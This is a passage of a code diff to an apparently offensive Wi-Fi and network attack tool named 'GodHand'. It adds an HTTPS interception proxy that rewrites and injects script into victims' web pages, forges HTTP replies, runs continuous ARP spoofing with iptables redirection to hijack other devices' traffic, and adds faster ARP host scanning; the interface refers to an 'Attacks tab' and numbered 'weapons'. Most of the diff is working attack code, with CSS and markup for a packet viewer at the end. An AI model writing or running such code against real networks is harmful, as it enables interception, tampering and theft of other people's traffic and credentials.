@@ -30,8 +30,11 @@ import secrets
 import uuid
 import sqlite3
 import csv
+import ssl
+import gzip
 from functools import wraps
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, jsonify, render_template_string, abort, Response, send_file
 
 # ---------- configuration ----------
@@ -730,6 +733,126 @@ class TrafficDatabase:
             return None
 
 # ---------- HTTPS MITM Proxy Core ----------
+class HTTPManipulator:
+    """Parses, modifies, and rebuilds HTTP/1.1 traffic streams.
+
+    Handles chunked encoding, gzip compression, and header manipulation
+    to enable active injection of content into HTTP responses.
+    """
+
+    @staticmethod
+    def _decode_chunked(data: bytes) -> bytes:
+        """Decode chunked transfer encoding."""
+        result = b''
+        while data:
+            try:
+                end = data.find(b'\r\n')
+                if end == -1:
+                    break
+                chunk_size = int(data[:end], 16)
+                if chunk_size == 0:
+                    break
+                chunk_start = end + 2
+                chunk_end = chunk_start + chunk_size
+                result += data[chunk_start:chunk_end]
+                data = data[chunk_end + 2:]
+            except:
+                break
+        return result
+
+    @staticmethod
+    def parse_http_response(data: bytes) -> dict:
+        """Split HTTP response headers and body. Decompress if needed.
+
+        Returns dict with keys: status_line, headers, body
+        """
+        try:
+            header_end = data.find(b'\r\n\r\n')
+            if header_end == -1:
+                return {'status_line': '', 'headers': {}, 'body': data, 'raw': data}
+
+            header_end += 4
+            headers_raw = data[:header_end]
+            body = data[header_end:]
+
+            lines = headers_raw.split(b'\r\n')
+            status_line = lines[0].decode('utf-8', errors='ignore')
+            headers = {}
+
+            for line in lines[1:]:
+                if b': ' in line:
+                    key, val = line.split(b': ', 1)
+                    headers[key.decode().lower()] = val.decode('utf-8', errors='ignore')
+
+            if headers.get('transfer-encoding', '').lower() == 'chunked':
+                body = HTTPManipulator._decode_chunked(body)
+
+            if headers.get('content-encoding', '').lower() == 'gzip':
+                try:
+                    body = gzip.decompress(body)
+                except:
+                    pass
+
+            return {
+                'status_line': status_line,
+                'headers': headers,
+                'body': body,
+                'raw': data
+            }
+        except Exception as e:
+            add_log('dev', f'HTTP parse error: {e}')
+            return {'status_line': '', 'headers': {}, 'body': data, 'raw': data}
+
+    @staticmethod
+    def rebuild_http_response(parsed: dict, new_body: bytes = None) -> bytes:
+        """Rebuild HTTP response with modified body, recalculating Content-Length.
+
+        Removes Transfer-Encoding and Content-Encoding to simplify for client.
+        """
+        try:
+            body_to_send = new_body if new_body is not None else parsed['body']
+            headers = dict(parsed['headers'])
+
+            headers['content-length'] = str(len(body_to_send))
+            headers.pop('transfer-encoding', None)
+            headers.pop('content-encoding', None)
+
+            status_line = parsed['status_line']
+            if not status_line.endswith('\r\n'):
+                status_line += '\r\n'
+
+            header_lines = []
+            for k, v in headers.items():
+                header_lines.append(f"{k.title()}: {v}")
+
+            header_block = status_line + '\r\n'.join(header_lines) + '\r\n\r\n'
+            return header_block.encode('utf-8', errors='ignore') + body_to_send
+        except Exception as e:
+            add_log('dev', f'HTTP rebuild error: {e}')
+            return parsed.get('raw', body_to_send)
+
+def create_custom_http_reply(status_code: int, headers: dict, body: bytes) -> bytes:
+    """Craft a raw HTTP/1.1 response packet from scratch (spoofing).
+
+    Used to reply with fake responses (302 redirect, fake JSON, etc.)
+    without contacting the real upstream server.
+    """
+    status_map = {
+        200: 'OK', 301: 'Moved Permanently', 302: 'Found',
+        304: 'Not Modified', 400: 'Bad Request', 401: 'Unauthorized',
+        403: 'Forbidden', 404: 'Not Found', 500: 'Internal Server Error'
+    }
+    status_text = status_map.get(status_code, 'OK')
+    response_line = f"HTTP/1.1 {status_code} {status_text}\r\n"
+
+    if 'content-length' not in headers:
+        headers['Content-Length'] = str(len(body))
+    if 'server' not in headers:
+        headers['Server'] = 'GodHand/1.0'
+
+    header_block = ''.join([f"{k}: {v}\r\n" for k, v in headers.items()])
+    return response_line.encode() + header_block.encode() + b'\r\n' + body
+
 class HTTPSInterceptProxy:
     """Pure Python HTTPS interception proxy (transparent MITM).
 
@@ -753,6 +876,7 @@ class HTTPSInterceptProxy:
         self.proxy_thread = None
         self.traffic_log = []
         self.max_log_size = max_log_size
+        self.executor = ThreadPoolExecutor(max_workers=50)
 
     @staticmethod
     def extract_sni(data: bytes) -> str:
@@ -822,6 +946,89 @@ class HTTPSInterceptProxy:
             add_log('warn', f'Failed to extract SNI: {e}')
             return ""
 
+    def detect_cert_pinning_app(self, client_addr: str, hostname: str) -> bool:
+        """Detect if connection is from a pinning-enabled app.
+
+        Returns True if this is likely a pinned connection that will reject our fake cert.
+        Uses heuristics: known pinning apps, enterprise SSL pinning patterns, and user-defined list.
+        """
+        # Check user-defined pinning bypass list first
+        if hostname in PINNED_HOSTS and PINNED_HOSTS[hostname]['enabled']:
+            return True
+
+        # Known apps with strong cert pinning
+        pinning_patterns = {
+            'com.google': ['drive.google.com', 'accounts.google.com', 'play.google.com'],
+            'com.facebook': ['facebook.com', 'instagram.com', 'messenger.com'],
+            'com.twitter': ['twitter.com', 'api.twitter.com'],
+            'com.stripe': ['stripe.com', 'api.stripe.com'],
+            'banking': ['bank', 'secure', 'credential'],
+            'health': ['healthkit', 'medical', 'hsa'],
+        }
+
+        # Check hostname against known pinning domains
+        for app_pattern, domains in pinning_patterns.items():
+            for domain in domains:
+                if domain in hostname:
+                    return True
+
+        # Check for enterprise-grade pinning indicators in hostname
+        enterprise_indicators = ['api.', 'secure.', 'auth.', 'oauth.']
+        if any(ind in hostname for ind in enterprise_indicators):
+            # Likely enterprise service with pinning
+            if 'internal' in hostname or 'private' in hostname or 'corp' in hostname:
+                return True
+
+        return False
+
+    def transparent_passthrough(self, client_socket: socket.socket, hostname: str, client_addr: tuple) -> bool:
+        """Attempt transparent passthrough for pinned certificates.
+
+        Relay traffic between client and upstream without TLS interception.
+        This preserves the original certificate chain and bypasses pinning.
+
+        Returns True if passthrough succeeded, False if interception should be attempted instead.
+        """
+        upstream_socket = None
+        try:
+            # Connect to upstream server
+            upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            upstream_socket.settimeout(10)
+            upstream_socket.connect((hostname, 443))
+
+            add_log('info', f'Cert pinning detected: transparent passthrough for {client_addr[0]} → {hostname}')
+
+            # Forward all traffic between client and upstream (encrypted, unchanged)
+            client_socket.settimeout(0.5)
+            upstream_socket.settimeout(0.5)
+
+            sockets = [client_socket, upstream_socket]
+            while True:
+                readable, _, _ = select.select(sockets, [], [], 1)
+                for sock in readable:
+                    try:
+                        data = sock.recv(8192)
+                        if not data:
+                            return True
+
+                        # Forward to other socket
+                        other_sock = upstream_socket if sock is client_socket else client_socket
+                        other_sock.sendall(data)
+                    except (socket.timeout, socket.error):
+                        pass
+
+        except socket.error as e:
+            add_log('warn', f'Passthrough failed for {hostname}: {e}')
+            return False
+        finally:
+            if upstream_socket:
+                try:
+                    upstream_socket.close()
+                except:
+                    pass
+
+        return True
+
     def handle_client_connection(self, client_socket: socket.socket, client_addr: tuple):
         """Handle incoming client TLS connection.
 
@@ -864,6 +1071,13 @@ class HTTPSInterceptProxy:
             if not hostname:
                 add_log('warn', f'Could not extract SNI from {client_addr[0]}')
                 hostname = 'unknown.local'
+
+            # Check for cert pinning before attempting interception
+            if self.detect_cert_pinning_app(client_addr[0], hostname):
+                add_log('info', f'Cert pinning detected for {hostname} - attempting transparent passthrough')
+                if self.transparent_passthrough(client_socket, hostname, client_addr):
+                    return  # Passthrough succeeded
+                add_log('warn', f'Passthrough failed for {hostname} - falling back to interception')
 
             add_log('info', f'MITM intercepting {client_addr[0]} → {hostname}:443')
 
@@ -957,10 +1171,23 @@ class HTTPSInterceptProxy:
                     # Upstream → Client
                     data = upstream_tls.recv(buffer_size)
                     if data:
-                        # Phase 2: Apply injection rules to responses
-                        data = ResponseModifier.apply_rules(hostname, data)
+                        # Parse response for inspection/modification
+                        parsed = HTTPManipulator.parse_http_response(data)
+
+                        # Apply injection rules to modify response content
+                        modified_body = parsed['body']
+                        if 'text/html' in parsed['headers'].get('content-type', '').lower():
+                            # Example: Inject logging script before </body>
+                            injection = ResponseModifier.apply_rules(hostname, parsed['body'])
+                            if injection != parsed['body']:
+                                modified_body = injection
+
+                        # Rebuild response with modified body
+                        if modified_body != parsed['body']:
+                            data = HTTPManipulator.rebuild_http_response(parsed, modified_body)
+
                         client_tls.sendall(data)
-                        # Phase 1: Log HTTP responses (first line contains status code)
+                        # Log HTTP responses (first line contains status code)
                         if data.startswith(b'HTTP/'):
                             self._log_http_response(data, hostname, client_ip)
                 except socket.timeout:
@@ -1036,12 +1263,8 @@ class HTTPSInterceptProxy:
                 try:
                     server_socket.settimeout(1)
                     client_socket, client_addr = server_socket.accept()
-                    # Handle each connection in a thread
-                    threading.Thread(
-                        target=self.handle_client_connection,
-                        args=(client_socket, client_addr),
-                        daemon=True
-                    ).start()
+                    # Handle each connection via bounded thread pool (max 50 workers)
+                    self.executor.submit(self.handle_client_connection, client_socket, client_addr)
                 except socket.timeout:
                     continue
                 except Exception as e:
@@ -1051,8 +1274,9 @@ class HTTPSInterceptProxy:
             self.running = False
 
     def stop(self):
-        """Stop MITM proxy server."""
+        """Stop MITM proxy server and shut down thread pool."""
         self.running = False
+        self.executor.shutdown(wait=False)
         add_log('info', 'MITM proxy stopped')
 
     def _add_traffic_entry(self, entry: dict):
@@ -1072,6 +1296,245 @@ class HTTPSInterceptProxy:
         """Return recent traffic log entries."""
         return self.traffic_log[-limit:]
 
+
+class ARPSpoofingFallback:
+    """Fallback MITM via ARP spoofing when transparent proxy unavailable.
+
+    When transparent interception fails, fall back to ARP spoofing:
+    1. Declare ourselves as the gateway using ARP replies
+    2. Configure Linux routing to forward intercepted traffic
+    3. Use iptables to redirect HTTPS traffic to local proxy port
+    4. Gracefully handle cleanup on disable
+    """
+
+    def __init__(self):
+        self.active = False
+        self.spoofed_gateway_ip = None
+        self.real_gateway_mac = None
+        self.our_mac = None
+        self.iface = None
+        self.targets = []
+        self.spoof_thread = None
+
+    def detect_transparent_proxy_available(self, iface: str) -> bool:
+        """Check if transparent proxy mode is available on this interface.
+
+        Returns True if iptables REDIRECT target is available.
+        """
+        try:
+            # Test if we can query iptables (requires root)
+            result = subprocess.run(
+                ['iptables', '-L', '-n', '-t', 'nat'],
+                capture_output=True, timeout=2, text=True
+            )
+            return result.returncode == 0
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            return False
+
+    def enable_arp_spoofing(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
+        """Enable ARP spoofing fallback on specified interface.
+
+        Args:
+            iface: Network interface (e.g., 'wlan0')
+            gateway_ip: Real gateway IP to spoof
+            targets: List of target IP addresses to intercept
+            our_ip: Our IP address on this interface
+        """
+        if self.active:
+            add_log('warn', 'ARP spoofing already active')
+            return False
+
+        try:
+            # Get our MAC address
+            result = subprocess.run(
+                ['ip', 'link', 'show', iface],
+                capture_output=True, text=True, timeout=5
+            )
+            match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
+            if not match:
+                add_log('error', f'Could not determine MAC address for {iface}')
+                return False
+            self.our_mac = match.group(1)
+
+            # Get real gateway MAC via ARP
+            result = subprocess.run(
+                ['arp', '-n', gateway_ip],
+                capture_output=True, text=True, timeout=5
+            )
+            match = re.search(r'([0-9a-f:]+) at', result.stdout)
+            if not match:
+                add_log('warn', f'Could not resolve gateway MAC for {gateway_ip}')
+                self.real_gateway_mac = None
+            else:
+                self.real_gateway_mac = match.group(1)
+
+            # Enable IP forwarding
+            self._enable_ip_forwarding()
+
+            # Configure iptables for traffic redirection
+            self._configure_iptables(iface, targets)
+
+            self.active = True
+            self.iface = iface
+            self.spoofed_gateway_ip = gateway_ip
+            self.targets = targets
+
+            # Start ARP spoofing thread
+            self.spoof_thread = threading.Thread(
+                target=self._spoof_arp_loop,
+                args=(iface, gateway_ip, targets, our_ip),
+                daemon=True
+            )
+            self.spoof_thread.start()
+
+            add_log('success', f'ARP spoofing fallback enabled on {iface}')
+            return True
+
+        except Exception as e:
+            add_log('error', f'Failed to enable ARP spoofing: {e}')
+            return False
+
+    def _enable_ip_forwarding(self):
+        """Enable IP forwarding in kernel."""
+        try:
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+                capture_output=True, timeout=5, check=True
+            )
+            add_log('info', 'IP forwarding enabled')
+        except (FileNotFoundError, subprocess.CalledProcessError):
+            add_log('warn', 'Failed to enable IP forwarding (sysctl unavailable)')
+
+    def _configure_iptables(self, iface: str, targets: list):
+        """Configure iptables to redirect HTTPS traffic to proxy."""
+        try:
+            # Create custom chain for traffic interception
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-N', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )  # Ignore error if chain exists
+
+            # Redirect HTTPS traffic from targets to proxy port
+            for target_ip in targets:
+                subprocess.run(
+                    ['iptables', '-t', 'nat', '-A', 'GODHAND_HTTPS',
+                     '-p', 'tcp', '-d', target_ip, '--dport', '443',
+                     '-j', 'REDIRECT', '--to-port', '8888'],
+                    capture_output=True, timeout=5, check=True
+                )
+
+            # Forward chain to apply redirection
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-A', 'POSTROUTING',
+                 '-i', iface, '-j', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5, check=True
+            )
+
+            add_log('success', f'iptables redirection configured for {len(targets)} targets')
+
+        except (FileNotFoundError, subprocess.CalledProcessError) as e:
+            add_log('warn', f'iptables configuration failed: {e}')
+
+    def _spoof_arp_loop(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
+        """Continuously send ARP replies claiming to be the gateway.
+
+        This makes target devices think we are the gateway, routing traffic through us.
+        """
+        try:
+            # Build ARP reply packet: we claim to own the gateway IP
+            src_mac = self.our_mac.replace(':', '')
+            src_mac_bytes = bytes.fromhex(src_mac)
+
+            while self.active:
+                for target_ip in targets:
+                    try:
+                        # ARP reply: we are gateway_ip
+                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
+                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+                        sock.bind((iface, 0))
+                        sock.send(packet)
+                        sock.close()
+                    except Exception as e:
+                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')
+
+                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
+
+        except Exception as e:
+            add_log('error', f'ARP spoofing loop failed: {e}')
+
+    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
+        """Build raw ARP reply packet."""
+        # Ethernet header
+        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
+        frame_type = struct.pack('!H', 0x0806)  # ARP
+
+        # ARP packet
+        hw_type = struct.pack('!H', 1)  # Ethernet
+        proto_type = struct.pack('!H', 0x0800)  # IPv4
+        hw_len = struct.pack('!B', 6)  # MAC length
+        proto_len = struct.pack('!B', 4)  # IP length
+        operation = struct.pack('!H', 2)  # Reply
+
+        # Convert IPs to bytes
+        gw_bytes = socket.inet_aton(gateway_ip)
+        target_bytes = socket.inet_aton(target_ip)
+
+        arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
+                      src_mac + gw_bytes + dst_mac + target_bytes)
+
+        return dst_mac + src_mac + frame_type + arp_packet
+
+    def disable_arp_spoofing(self):
+        """Disable ARP spoofing and clean up iptables rules."""
+        if not self.active:
+            return
+
+        self.active = False
+
+        try:
+            # Flush GODHAND_HTTPS chain
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-F', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Delete GODHAND_HTTPS chain
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-X', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Remove POSTROUTING rule
+            subprocess.run(
+                ['iptables', '-t', 'nat', '-D', 'POSTROUTING',
+                 '-i', self.iface, '-j', 'GODHAND_HTTPS'],
+                capture_output=True, timeout=5
+            )
+
+            # Disable IP forwarding (if no other services need it)
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=0'],
+                capture_output=True, timeout=5
+            )
+
+            add_log('success', 'ARP spoofing fallback disabled and cleaned up')
+
+        except Exception as e:
+            add_log('warn', f'Cleanup failed: {e}')
+
+    def get_status(self) -> dict:
+        """Get current ARP spoofing fallback status."""
+        return {
+            'active': self.active,
+            'interface': self.iface,
+            'gateway_ip': self.spoofed_gateway_ip,
+            'gateway_mac': self.real_gateway_mac,
+            'our_mac': self.our_mac,
+            'targets_count': len(self.targets) if self.targets else 0
+        }
+
+
+ARP_FALLBACK = ARPSpoofingFallback()
 
 # Initialize MITM proxy on startup
 try:
@@ -1587,32 +2050,47 @@ def arp_scan(iface, my_ip, cidr):
         if len(hosts) >= MAX_SCAN_HOSTS:
             add_log('warn', f'ARP scan capped at {MAX_SCAN_HOSTS} hosts (network {net} is larger); scan the subnet directly for full coverage')
             break
-    for ip in hosts:
-        try:
-            sock.send(arp_packet(src_mac, my_ip, ip))
-        except OSError as e:
-            add_log('dev', f'ARP packet send failed for {ip}: {e}')
-            pass
-
-    deadline = time.time() + 4
+    batch_size = 64
+    max_retries = 3
+    global_deadline = time.time() + 8.0
+    unreplied = set(hosts)
+    retry_count = {ip: 0 for ip in hosts}
     seen = {}
-    while time.time() < deadline:
-        try:
-            r, _, _ = select.select([sock], [], [], 0.1)
-            if r:
-                data, _ = sock.recvfrom(65535)
-                if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
-                    if struct.unpack('!H', data[20:22])[0] == 2:
-                        sip = socket.inet_ntoa(data[28:32])
-                        smac = data[22:28]
-                        if sip != my_ip and smac != b'\x00' * 6:
-                            mac = smac.hex(':')
-                            if sip not in seen:
-                                seen[sip] = mac
-                                results.append({'ip': sip, 'mac': mac})
-        except OSError as e:
-            add_log('dev', f'ARP receive error: {e}')
-            break
+
+    while unreplied and time.time() < global_deadline:
+        batch = list(unreplied)[:batch_size]
+
+        for ip in batch:
+            try:
+                sock.send(arp_packet(src_mac, my_ip, ip))
+                retry_count[ip] += 1
+            except OSError as e:
+                add_log('dev', f'ARP packet send failed for {ip} (attempt {retry_count[ip]+1}): {e}')
+                unreplied.discard(ip)
+
+        batch_deadline = time.time() + 0.8
+        while time.time() < batch_deadline:
+            try:
+                r, _, _ = select.select([sock], [], [], 0.05)
+                if r:
+                    data, _ = sock.recvfrom(65535)
+                    if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
+                        if struct.unpack('!H', data[20:22])[0] == 2:
+                            sip = socket.inet_ntoa(data[28:32])
+                            smac = data[22:28]
+                            if sip != my_ip and smac != b'\x00' * 6:
+                                mac = smac.hex(':')
+                                if sip not in seen:
+                                    seen[sip] = mac
+                                    results.append({'ip': sip, 'mac': mac})
+                                unreplied.discard(sip)
+            except OSError as e:
+                add_log('dev', f'ARP receive error: {e}')
+                break
+
+        time.sleep(0.01)
+
+        unreplied = {ip for ip in unreplied if retry_count.get(ip, 0) < max_retries and time.time() < global_deadline}
 
     if sock:
         try:
@@ -2160,6 +2638,31 @@ def set_monitor(iface, enable=True, raise_on_fail=False):
             raise RuntimeError(str(e))
         return False
 
+def check_monitor_mode_ioctl(iface):
+    """Fallback ioctl-based monitor mode check for stock Android (when iw unavailable).
+
+    Queries the current wireless mode using SIOCGIWMODE without requiring iw utility.
+    Robust to missing wireless extensions (returns False rather than crashing).
+
+    Returns: True if monitor mode is active, False if managed/AP/unknown or unavailable.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            ifreq = struct.pack('16sH', iface.encode()[:15], 0)
+            res = fcntl.ioctl(sock.fileno(), 0x8913, ifreq)  # SIOCGIWMODE
+            mode = struct.unpack('H', res[16:18])[0]
+            # nl80211 monitor mode = 6 (IW_MODE_MONITOR); also handle wext variants
+            is_monitor = mode == 6 or mode == 3
+            if not is_monitor:
+                add_log('dev', f'Interface {iface} mode {mode} (not monitor)')
+            return is_monitor
+        finally:
+            sock.close()
+    except (OSError, IOError, struct.error) as e:
+        add_log('dev', f'Monitor mode ioctl check failed on {iface}: {type(e).__name__}')
+        return False
+
 def check_monitor_support(iface):
     """Check if monitor mode is supported by the interface/driver.
 
@@ -2169,6 +2672,8 @@ def check_monitor_support(iface):
     used to fall back to flipping the interface into monitor mode and back
     just to test it, and to a blanket `iw phy` dump (every radio on the
     system, not just this one) for the initial check -- both fixed here.
+
+    Falls back to ioctl-based check on Android where iw is unavailable.
     """
     try:
         dev_info = subprocess.check_output(
@@ -2184,7 +2689,8 @@ def check_monitor_support(iface):
             return False
         return any(re.match(r'\s*\*\s*monitor\s*$', line) for line in modes_match.group(1).splitlines())
     except Exception:
-        return False
+        # iw not available (stock Android). Fallback to ioctl check.
+        return check_monitor_mode_ioctl(iface)
 
 # ---------- native (no-monitor-mode) deauth via AP station-del ----------
 # When this device's own Wi-Fi interface is running as an access point (e.g. a
@@ -3513,7 +4019,7 @@ def index():
 :root {
   /* palette sampled directly from the login/app background photo (app-bg-photo) */
   --bg-base: #011236;
-  --bg-elevated: rgba(80,80,80,0.45);
+  --bg-elevated: rgba(40,40,45,0.55);
   --bg-inset: rgba(255,255,255,0.05);
   --border-subtle: rgba(255,255,255,0.12);
   --border-strong: rgba(255,255,255,0.22);
@@ -4014,6 +4520,102 @@ tr:hover td { background: rgba(255,255,255,0.02); }
   justify-content: center;
 }
 .chip-action:hover { background: var(--glow-accent); color: var(--accent-primary); }
+
+/* Packet Capture List (Compact Grid-based) */
+#packet-capture-container { margin: 0; padding: 0; }
+.packet-toolbar { margin-bottom: 12px; }
+#packetList {
+  display: flex;
+  flex-direction: column;
+  font-family: 'JetBrains Mono', 'Courier New', monospace;
+  font-size: 13px;
+  line-height: 1.4;
+}
+.packet-row {
+  display: grid;
+  grid-template-columns: 40px 80px 1fr 1fr 50px 50px 1.5fr;
+  gap: 6px;
+  padding: 6px 10px;
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  align-items: center;
+  cursor: pointer;
+  transition: background 0.1s;
+  min-height: 36px;
+}
+.packet-row:nth-child(even) { background: rgba(255,255,255,0.02); }
+.packet-row:hover { background: rgba(84,180,236,0.12); }
+.packet-row.expanded { background: rgba(84,180,236,0.2); border-bottom: 0; }
+.packet-row .expand-icon {
+  display: inline-block;
+  width: 16px;
+  height: 16px;
+  transform: rotate(0deg);
+  transition: transform 0.2s;
+  text-align: center;
+  color: var(--text-secondary);
+  font-size: 12px;
+}
+.packet-row.expanded .expand-icon { transform: rotate(90deg); }
+.packet-row .time { color: var(--text-secondary); font-size: 12px; }
+.packet-row .addr { color: var(--accent-tertiary); font-size: 12px; }
+.packet-row .proto {
+  display: inline-block;
+  padding: 2px 6px;
+  border-radius: 3px;
+  font-size: 11px;
+  font-weight: 600;
+  color: #000;
+}
+.packet-row .proto.tcp { background: var(--info); }
+.packet-row .proto.udp { background: var(--success); }
+.packet-row .proto.icmp { background: var(--warning); }
+.packet-row .len { color: var(--text-secondary); text-align: right; font-size: 11px; }
+.packet-row .summary {
+  color: var(--text-primary);
+  font-size: 12px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.packet-detail {
+  display: none;
+  grid-column: 1 / -1;
+  padding: 12px;
+  background: rgba(0,0,0,0.3);
+  border-top: 1px solid rgba(255,255,255,0.08);
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  font-size: 11px;
+  white-space: pre-wrap;
+  word-break: break-all;
+  max-height: 300px;
+  overflow-y: auto;
+  color: var(--text-secondary);
+  line-height: 1.3;
+}
+.packet-row.expanded .packet-detail { display: block; }
+.packet-detail-header { color: var(--accent-primary); font-weight: 600; margin-bottom: 8px; }
+.hexdump {
+  margin-top: 8px;
+  padding: 8px;
+  background: rgba(0,0,0,0.5);
+  border-radius: 4px;
+  border: 1px solid rgba(255,255,255,0.08);
+  color: var(--accent-tertiary);
+  overflow-x: auto;
+}
+@media (max-width: 768px) {
+  .packet-row {
+    grid-template-columns: 30px 70px 1fr 1fr 40px 40px 1fr;
+    font-size: 11px;
+    padding: 4px 8px;
+    min-height: 32px;
+    gap: 4px;
+  }
+  .packet-row .addr { font-size: 11px; }
+  .packet-row .summary { font-size: 11px; }
+  .packet-detail { font-size: 10px; padding: 8px; }
+}
+
 .btn-icon {
   background: none;
   border: none;
@@ -4633,34 +5235,38 @@ GODHAND_DDNS_ENABLED=1                  # optional, default on when the above ar
     </div>
     <div class="card">
       <h2>Live packet feed</h2>
-      <p class="sub">Every IPv4 TCP/UDP/ICMP packet to or from your targets, newest at the bottom -- like a live Wireshark capture scoped to this device.</p>
-      <div style="display:grid; grid-template-columns:1fr 1fr 1fr auto; gap:8px; margin-bottom:12px; align-items:end;">
-        <div>
-          <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Protocol</label>
-          <select id="filter-proto" onchange="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
-            <option value="">All</option>
-            <option value="tcp">TCP only</option>
-            <option value="udp">UDP only</option>
-            <option value="icmp">ICMP only</option>
-          </select>
+      <p class="sub">Every IPv4 TCP/UDP/ICMP packet to or from your targets — compact Wireshark-style view. Click any row to expand details and hexdump.</p>
+      <div id="packet-capture-container">
+        <div class="packet-toolbar">
+          <div style="display:grid; grid-template-columns:1fr 1fr 1fr auto; gap:8px; width:100%; align-items:end;">
+            <div>
+              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Protocol</label>
+              <select id="filter-proto" onchange="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
+                <option value="">All</option>
+                <option value="tcp">TCP only</option>
+                <option value="udp">UDP only</option>
+                <option value="icmp">ICMP only</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">IP Filter</label>
+              <input type="text" id="filter-ip" placeholder="Filter by IP" onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
+            </div>
+            <div>
+              <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Search</label>
+              <input type="text" id="filter-info" placeholder="Port, SNI, DNS..." onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
+            </div>
+            <div style="display:flex; gap:6px;">
+              <button onclick="clearPacketFilters()" style="padding:6px 12px; background:#444; color:#0f0; border:1px solid #555; border-radius:4px; cursor:pointer; font-size:0.85rem;">Clear</button>
+              <button onclick="exportPacketsCSV()" style="padding:6px 12px; background:#444; color:#0f0; border:1px solid #555; border-radius:4px; cursor:pointer; font-size:0.85rem;">Export</button>
+            </div>
+          </div>
         </div>
-        <div>
-          <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Source/Dest IP</label>
-          <input type="text" id="filter-ip" placeholder="Filter by IP" onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
+        <div id="packetList" style="border:1px solid #444; border-radius:4px; max-height:380px; overflow-y:auto; background:#0a0a0a;">
+          <!-- Packets rendered dynamically -->
         </div>
-        <div>
-          <label style="font-size:0.75rem; display:block; margin-bottom:4px; color:#999;">Info search</label>
-          <input type="text" id="filter-info" placeholder="HTTP status, port, TLS SNI..." onkeyup="applyPacketFilters()" style="width:100%; padding:6px; border:1px solid #444; background:#1a1a1a; color:#0f0; border-radius:4px; font-size:0.85rem;">
-        </div>
-        <button onclick="clearPacketFilters()" style="padding:6px 12px; background:#444; color:#0f0; border:1px solid #555; border-radius:4px; cursor:pointer; font-size:0.85rem;">Reset</button>
       </div>
-      <div class="table-responsive" style="max-height:380px; overflow-y:auto;">
-        <table id="traffic-packets-table" style="display:none; font-family:'JetBrains Mono',monospace; font-size:0.78rem;">
-          <thead><tr><th>No.</th><th>Time</th><th>Dir</th><th>Source</th><th>Destination</th><th>Proto</th><th>Length</th><th>Info</th></tr></thead>
-          <tbody id="traffic-packets-body"></tbody>
-        </table>
-      </div>
-      <div class="empty" id="traffic-empty">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
+      <div class="empty" id="traffic-empty" style="display:none;">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
     </div>
     <div class="card">
       <h2>Reassembled HTTP streams</h2>
@@ -4919,23 +5525,112 @@ function formatPacketRow(e) {
     </tr>
   `;
 }
+
+function formatPacketRowCompact(e, idx) {
+  const time = new Date(e.t * 1000);
+  const hh = String(time.getHours()).padStart(2, '0');
+  const mm = String(time.getMinutes()).padStart(2, '0');
+  const ss = String(time.getSeconds()).padStart(2, '0');
+  const ms = String(time.getMilliseconds()).padStart(3, '0');
+  const timeStr = `${hh}:${mm}:${ss}.${ms}`;
+
+  const dirArrow = e.dir === 'out' ? '↑' : '↓';
+  const protoClass = e.proto.toLowerCase();
+  const summary = formatPacketInfo(e);
+
+  const hexdump = e.raw ? toHexdump(e.raw) : '(no raw data)';
+  const detail = formatPacketDetailView(e, hexdump);
+
+  return `
+    <div class="packet-row" data-packet-idx="${idx}" data-packet-no="${e.no}">
+      <span class="expand-icon">▶</span>
+      <span class="time">${timeStr}</span>
+      <span class="addr">${escapeHtml(e.src)}</span>
+      <span class="addr">${escapeHtml(e.dst)}</span>
+      <span class="proto ${protoClass}">${e.proto.toUpperCase()}</span>
+      <span class="len">${e.len}B</span>
+      <span class="summary">${escapeHtml(summary)}</span>
+      <div class="packet-detail">${detail}</div>
+    </div>
+  `;
+}
+
+function togglePacketDetail(e) {
